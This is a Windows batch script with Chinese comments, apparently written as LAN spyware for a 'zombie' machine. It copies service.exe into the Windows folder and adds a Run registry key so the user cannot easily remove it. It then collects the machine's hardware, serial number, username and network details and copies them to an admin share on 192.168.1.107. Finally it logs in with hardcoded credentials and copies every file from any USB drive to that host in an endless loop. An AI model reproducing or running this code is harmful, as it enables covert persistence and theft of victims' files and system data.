rem made by zhoushoujian on 2018/10/28
@echo off
rem 确保对方和你在同一个局域网下并且关闭自己的防火墙
mode con cols=90
ver
color 0A
echo %date% %time%

rem 拷贝主程序到其他目录并设置开机自启，防止用户手动删除这个文件
copy %~dp0\service.exe %windir%\service.exe
REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v service /t REG_SZ /d "%windir%\service.exe" /f

title 正在获取电脑相关配置信息
echo  正在获取电脑相关配置信息

rem 生成肉鸡的电脑报告并发动给自己
for /f "tokens=4" %%a in ('route print^|findstr 0.0.0.0.*0.0.0.0') do (
     set IP=%%a
)

rem 回显到控制台
echo ip: %IP% 
echo 登录名：%USERNAME%
echo 计算机名：%COMPUTERNAME%
for /f "tokens=2 delims==" %%a in ('wmic cpu get Name /value ^| findstr /i "Name"') do echo 处理器：%%~a
for /f "tokens=2 delims==" %%a in ('wmic memorychip get Capacity /value ^| findstr /i "Capacity"') do echo 内存容量：%%~a
for /f "tokens=2 delims==" %%a in ('wmic DiskDrive get Size /value ^| findstr /i "Size"') do echo 硬盘容量：%%~a
for /f "tokens=2 delims==" %%a in ('wmic csproduct get IdentifyingNumber /value ^| findstr /i "IdentifyingNumber"') do echo SN序列号：%%~a
for /f "tokens=2 delims==" %%a in ('wmic csproduct get Name /value ^| findstr /i "Name"') do echo 电脑型号：%%~a
for /f "tokens=2 delims==" %%a in ('wmic csproduct get Vendor /value ^| findstr /i "Vendor"') do echo 制造商：%%~a

rem 打印到日志
echo time: %date% %time% >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
echo ip: %IP% >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
echo 登录名：%USERNAME% >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
echo 计算机名：%COMPUTERNAME% >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
for /f "tokens=2 delims==" %%a in ('wmic cpu get Name /value ^| findstr /i "Name"') do echo 处理器：%%~a >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
for /f "tokens=2 delims==" %%a in ('wmic memorychip get Capacity /value ^| findstr /i "Capacity"') do echo 内存容量：%%~a >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
for /f "tokens=2 delims==" %%a in ('wmic DiskDrive get Size /value ^| findstr /i "Size"') do echo 硬盘容量：%%~a >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
for /f "tokens=2 delims==" %%a in ('wmic csproduct get IdentifyingNumber /value ^| findstr /i "IdentifyingNumber"') do echo SN序列号：%%~a >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
for /f "tokens=2 delims==" %%a in ('wmic csproduct get Name /value ^| findstr /i "Name"') do echo 电脑型号：%%~a >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
for /f "tokens=2 delims==" %%a in ('wmic csproduct get Vendor /value ^| findstr /i "Vendor"') do echo 制造商：%%~a >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief

sc config  winmgmt start= auto >nul 2<&1
net start winmgmt 2>nul
setlocal  ENABLEDELAYEDEXPANSION
echo 主版:
for /f "tokens=1,* delims==" %%a in ('wmic BASEBOARD get Manufacturer^,Product^,Version^,SerialNumber /value') do (
     set /a tee+=1
     if "!tee!" == "3" echo       制造商   = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief && echo       制造商   = %%b
     if "!tee!" == "4" echo       型  号   = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       型  号   = %%b
     if "!tee!" == "5" echo       序列号   = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       序列号   = %%b
     if "!tee!" == "6" echo       版  本   = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       版  本   = %%b
)
set tee=0
echo      BIOS:
for /f "tokens=1,* delims==" %%a in ('wmic bios  get 

CurrentLanguage^,Manufacturer^,SMBIOSBIOSVersion^,SMBIOSMajorVersion^,SMBIOSMinorVersion^,ReleaseDate /value') do (
     set /a tee+=1
     if "!tee!" == "3" echo       当前语言 = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       当前语言 = %%b
     if "!tee!" == "4" echo       制造商   = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       制造商   = %%b 
     if "!tee!" == "5" echo       发行日期 = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief echo       发行日期 = %%b 
     if "!tee!" == "6" echo       版  本   = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       版  本   = %%b
     if "!tee!" == "7" echo       SMBIOSMajorVersion = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       SMBIOSMajorVersion = %%b 
     if "!tee!" == "8" echo       SMBIOSMinorVersion = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       SMBIOSMinorVersion = %%b
)
set tee=0
echo.
echo CPU:
for /f "tokens=1,* delims==" %%a in ('wmic cpu get name^,ExtClock^,CpuStatus^,Description /value') do (
     set /a tee+=1
     if "!tee!" == "3" echo       CPU个数   = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       CPU个数   = %%b 
     if "!tee!" == "4" echo       处理器版本   = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       处理器版本   = %%b 
     if "!tee!" == "5" echo       外   频   = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&&  echo       外   频   = %%b
     if "!tee!" == "6" echo       名称及主频率   = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       名称及主频率   = %%b
)
set tee=0
echo.
echo 显示器:
for /f "tokens=1,* delims==" %%a in ('wmic DESKTOPMONITOR  get name^,ScreenWidth^,ScreenHeight^,PNPDeviceID /value') do (
     set /a tee+=1
     if "!tee!" == "3" echo       类    型  = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       类    型  = %%b 
     if "!tee!" == "4" echo       其他信息  = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       其他信息  = %%b
     if "!tee!" == "5" echo       屏幕高    = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       屏幕高    = %%b
     if "!tee!" == "6" echo       屏幕宽    = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       屏幕宽    = %%b
)
set tee=0
echo.
echo 硬  盘:
for /f "tokens=1,* delims==" %%a in ('wmic DISKDRIVE get model^,interfacetype^,size^,totalsectors^,partitions /value') do (
     set /a tee+=1
     if "!tee!" == "3" echo       接口类型  = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       接口类型  = %%b 
     if "!tee!" == "4" echo       硬盘型号  = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       硬盘型号  = %%b
     if "!tee!" == "5" echo       分区数    = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       分区数    = %%b
     if "!tee!" == "6" echo       容    量  = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       容    量  = %%b
     if "!tee!" == "7" echo       总扇区    = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       总扇区    = %%b 
)
echo 分区信息:
wmic LOGICALDISK  where mediatype='12' get description,deviceid,filesystem,size,freespace
set tee=0
echo.
echo 网  卡:
for /f "tokens=1,* delims==" %%a in ('wmic NICCONFIG where "index='1'" get ipaddress^,macaddress^,description /value') do (
     set /a tee+=1
     if "!tee!" == "3" echo       网卡类型  = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief && echo       网卡类型  = %%b
     if "!tee!" == "4" echo       网卡IP    = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief && echo       网卡IP    = %%b
     if "!tee!" == "5" echo       网卡MAC   = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief && echo       网卡MAC   = %%b 
)
set tee=0
echo.
echo 打印机:
for /f "tokens=1,* delims==" %%a in ('wmic PRINTER get caption /value') do (
     set /a tee+=1
     if "!tee!" == "3" echo       打印机名字  = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief && echo       打印机名字  = %%b
)

echo. >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
echo. >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
echo. >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
echo. >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
echo. >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
echo. >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
echo. >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief

rem 发送电脑配置信息
xcopy %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief \\192.168.1.107\\C$\\test /D /Y /K
del /f /q  %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief 

:working
title 正在连接自己的电脑
echo  正在连接自己的电脑
rem 连接自己的电脑
net use \\192.168.1.107\ipc$ "789" /user:zhou

title 正在获取u盘内容
echo  正在获取u盘内容
rem 获取u盘盘符
for /f "tokens=2 delims==" %%a in ('wmic LogicalDisk where "DriveType='2'" get DeviceID /value') do ( set DriveU=%%a )
echo u盘盘符为 %DriveU%

rem 遍历u盘里的文件
for /R %DriveU% %%b in (*.*) do (xcopy  %%b \\192.168.1.107\\C$\\test /D /Y /K)

goto working

title 文件已全部发送完毕，请检查
echo  文件已全部发送完毕，请检查


